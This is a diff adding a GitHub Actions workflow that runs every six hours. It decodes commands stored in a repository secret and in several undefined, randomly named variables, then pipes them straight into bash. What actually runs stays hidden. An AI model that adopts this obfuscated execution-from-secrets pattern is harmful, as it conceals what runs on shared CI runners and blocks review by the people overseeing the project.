@@ -1,0 +1,24 @@
+name: fanwulishang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fanwulishang
+        env:
+          t7: ${{ secrets.t7 }}
+        run: |
+          echo $t7 | jq -r .m023 | /bin/bash
+          echo $mvmn3142 | jq -r .gbs069 | /bin/bash
+          echo $wifyw1230 | jq -r .t71242 | /bin/bash
+          echo $i06 | jq -r .zg53895 | /bin/bash
+          echo $n75605 | jq -r .v03899 | /bin/bash
+          echo $hvcqo8 | jq -r .wj31391 | /bin/bash
+          echo $hchu6105 | jq -r .ocsc986 | /bin/bash
+
